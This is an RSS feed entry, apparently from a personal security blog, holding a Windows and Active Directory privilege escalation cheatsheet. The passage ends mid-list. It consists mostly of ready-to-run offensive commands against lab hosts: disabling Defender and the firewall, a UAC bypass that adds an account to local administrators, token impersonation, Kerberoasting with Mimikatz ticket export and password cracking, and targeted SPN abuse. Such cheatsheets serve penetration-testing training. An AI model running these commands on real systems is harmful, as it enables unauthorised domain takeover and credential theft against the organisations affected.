@@ -1,0 +1,412 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Privilege Escalation | Giovanni Pecoraro</title><link>https://www.peco602.com/tag/privilege-escalation/</link><atom:link href="https://www.peco602.com/tag/privilege-escalation/index.xml" rel="self" type="application/rss+xml"/><description>Privilege Escalation</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Sun, 31 Jul 2022 00:00:00 +0000</lastBuildDate><image><url>https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png</url><title>Privilege Escalation</title><link>https://www.peco602.com/tag/privilege-escalation/</link></image><item><title>Domain Privilege Escalation Cheatsheet</title><link>https://www.peco602.com/post/0020-domain-privilege-escalation-cheatsheet/</link><pubDate>Sun, 31 Jul 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0020-domain-privilege-escalation-cheatsheet/</guid><description>&lt;h2 id="windows-defender">Windows Defender&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Disable Windows Defender&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MpPreference&lt;/span> &lt;span class="n">-DisableRealtimeMonitoring&lt;/span> &lt;span class="vm">$true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MpPreference&lt;/span> &lt;span class="n">-DisableIOAVProtection&lt;/span> &lt;span class="vm">$true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Disable Firewall&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## cmd.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">netsh&lt;/span> &lt;span class="n">advfirewall&lt;/span> &lt;span class="nb">set &lt;/span>&lt;span class="n">allprofiles&lt;/span> &lt;span class="n">state&lt;/span> &lt;span class="n">off&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## powershell.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-NetFirewallProfile&lt;/span> &lt;span class="n">-Profile&lt;/span> &lt;span class="n">Domain&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Public&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Private&lt;/span> &lt;span class="n">-Enabled&lt;/span> &lt;span class="n">False&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="user-account-control-uac">User Account Control (UAC)&lt;/h2>
+&lt;p>In case you are a member of the local administrators group, but you still have the &lt;em>Medium Mandatory Level&lt;/em> label, it is necessary to bypass the &lt;em>User Account Control (UAC)&lt;/em>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># FodhelperUACBypass.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">FodhelperUACBypass&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">FodhelperUACBypass&lt;/span> &lt;span class="n">-program&lt;/span> &lt;span class="s2">&amp;#34;cmd.exe&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">FodhelperUACBypass&lt;/span> &lt;span class="n">-program&lt;/span> &lt;span class="s2">&amp;#34;cmd.exe /c powershell.exe&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">FodhelperUACBypass&lt;/span> &lt;span class="n">-program&lt;/span> &lt;span class="s2">&amp;#34;cmd.exe /c net localgroup administrators CYBERLAB\STUDENT01 /add&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Alternatively, you can use &lt;a href="https://github.com/FatRodzianko/SharpBypassUAC" target="_blank" rel="noopener">SharpBypassUAC&lt;/a>.&lt;/p>
+&lt;h2 id="token-manipulation">Token Manipulation&lt;/h2>
+&lt;p>Tokens can be impersonated from other users with a session/running processes on the machine. A similar effect can be achieved by using e.g. CobaltStrike to inject into said processes.&lt;/p>
+&lt;h3 id="incognito">Incognito&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># A SYSTEM shell is required&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">PsExec64&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-s&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Show tokens on the machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">incognito&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">list_tokens&lt;/span> &lt;span class="n">-u&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start new process with token of a specific user&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">incognito&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">execute&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT2&amp;#34;&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Windows&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">system32&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">calc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">incognito&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">execute&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT2&amp;#34;&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="invoke-tokenmanipulation">Invoke-TokenManipulation&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Show all tokens on the machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-TokenManipulation&lt;/span> &lt;span class="n">-ShowAll&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Show only unique, usable tokens on the machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-TokenManipulation&lt;/span> &lt;span class="n">-Enumerate&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start new process with token of a specific user&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-TokenManipulation&lt;/span> &lt;span class="n">-ImpersonateUser&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT2&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start new process with token of another process&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-TokenManipulation&lt;/span> &lt;span class="n">-CreateProcess&lt;/span> &lt;span class="s2">&amp;#34;C:\Windows\system32\calc.exe&amp;#34;&lt;/span> &lt;span class="n">-ProcessId&lt;/span> &lt;span class="mf">500&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="classic-kerberoasting">Classic Kerberoasting&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Find user accounts used as Service accounts:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="n">-SPN&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">ServicePrincipalName&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$null&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">ServicePrincipalName&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Request a Ticket Granting Service (TGS):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerShell&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-Type&lt;/span> &lt;span class="n">-AssemblyName&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityModel&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityModel&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Tokens&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">KerberosRequestorSecurityToken&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="s2">&amp;#34;MSSQLSvc/database.cyberlab.cybercorp.local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Request-SPNTicket&lt;/span> &lt;span class="n">-SPN&lt;/span> &lt;span class="s2">&amp;#34;MSSQLSvc/database.cyberlab.cybercorp.local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Check if the TGS has been granted:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">klist&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Export all tickets using Mimikatz&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::list /export&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Crack the Service account password (this step can be performed on a Kali machine):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># tgsrepcrack.py&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">git&lt;/span> &lt;span class="n">clone&lt;/span> &lt;span class="n">https&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="n">github&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">nidem&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">kerberoast&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">python3&lt;/span> &lt;span class="p">./&lt;/span>&lt;span class="n">tgsrepcrack&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">py&lt;/span> &lt;span class="p">./&lt;/span>&lt;span class="mf">10&lt;/span>&lt;span class="n">-million-password-list-top&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1000000&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="p">./&lt;/span>&lt;span class="n">240a10000-STUDENT1&lt;/span>&lt;span class="nv">@MSSQLSvc&lt;/span>&lt;span class="p">~&lt;/span>&lt;span class="n">database&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">localCYBERLAB&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">LOCAL&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>the same TGS can also be cracked by using &lt;code>john&lt;/code>, but it must be firstly converted into a compatible format:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># tgsrepcrack.py&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 ./kirbi2john.py -o ./tgs.john ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># JohnTheRipper&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/john --format&lt;span class="o">=&lt;/span>krb5tgs ./tgs.john --wordlist&lt;span class="o">=&lt;/span>./10-million-password-list-top-1000000.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;p>An alternative way to perform Kerberoasting is to use &lt;code>PowerSploit&lt;/code> combined to &lt;code>john&lt;/code> or &lt;code>hashcat&lt;/code>:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Find user accounts used as Service accounts:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="n">-SPN&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">ServicePrincipalName&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$null&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">ServicePrincipalName&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Request a TGS:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Kerberoast.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## JohnTheRipper (bleeding-jumbo branch)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Kerberoast&lt;/span> &lt;span class="n">-OutputFormat&lt;/span> &lt;span class="n">john&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Hash&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">john_tgs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## HashCat&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Kerberoast&lt;/span> &lt;span class="n">-OutputFormat&lt;/span> &lt;span class="n">hashcat&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Hash&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">hashcat_tgs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Brute-force the exported ticket:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># JohnTheRipper (bleeding-jumbo branch)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">john --format&lt;span class="o">=&lt;/span>krb5tgs --wordlist&lt;span class="o">=&lt;/span>./10-million-password-list-top-1000000.txt john_tgs.kirbi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># HashCat&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hashcat -m &lt;span class="m">13100&lt;/span> --force hashcat_tgs.kirbi ./10-million-password-list-top-1000000.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>hashcat&lt;/code> format can also be cracked by &lt;code>john&lt;/code>.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="targeted-kerberoasting-set-spn">Targeted Kerberoasting (Set SPN)&lt;/h2>
+&lt;p>With enough rights (&lt;em>GenericAll&lt;/em>/&lt;em>GenericWrite&lt;/em>), a target user’s SPN can be set to anything (unique in the domain). We can then request a TGS without special privileges. The TGS can then be “Kerberoasted”.&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Let’s enumerate the permissions for RDPUsers on ACLs&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># PowerView
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match &amp;#34;RDPUsers&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Check if the user already has a SPN:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ServicePrincipalName&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">ServicePrincipalName&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ServicePrincipalName&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Set a SPN for the user (must be unique for the domain):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainObject&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-Set&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">serviceprincipalname&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s1">&amp;#39;ops/whatever1&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ADUser&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-ServicePrincipalNames&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">Add&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s1">&amp;#39;ops/whatever1&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Request a TGS:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerShell&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-Type&lt;/span> &lt;span class="n">-AssemblyNAme&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityModel&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityModel&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Tokens&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">KerberosRequestorSecurityToken&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="s2">&amp;#34;ops/whatever1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Request-SPNTicket&lt;/span> &lt;span class="n">-SPN&lt;/span> &lt;span class="s2">&amp;#34;ops/whatever1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Check if the ticket has been granted:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">klist&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Export all tickets using Mimikatz:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::list /export&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Crack the Service account password (this step can be performed on a Kali machine):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># tgsrepcrack.py&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git clone https://github.com/nidem/kerberoast
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 ./tgsrepcrack.py ./10-million-password-list-top-1000000.txt ./240a10000-student1@ops~whatever1CYBERLAB.CYBERCORP.LOCAL.kirbi
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>the same TGS can also be cracked by using &lt;code>john&lt;/code>, but it must be firstly converted into a compatible format:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># tgsrepcrack.py&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 ./kirbi2john.py -o ./tgs.john ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># JohnTheRipper&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/john --format&lt;span class="o">=&lt;/span>krb5tgs ./tgs.john --wordlist&lt;span class="o">=&lt;/span>./10-million-password-list-top-1000000.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;h2 id="asreproasting-as-rep">ASREProasting (AS-REP)&lt;/h2>
+&lt;p>If a user’s &lt;em>UserAccountControl&lt;/em> settings have &lt;em>Do not require Kerberos preauthentication&lt;/em> enabled, i.e. Kerberos preauth is disabled, it is possible to grab user’s crackable AS-REP and brute-force it offline. With sufficient rights (&lt;em>GenericWrite&lt;/em> or &lt;em>GenericAll&lt;/em>), Kerberos preauth can be forced disabled as well.&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Enumerating accounts with Kerberos Preauth disabled:&lt;/p>
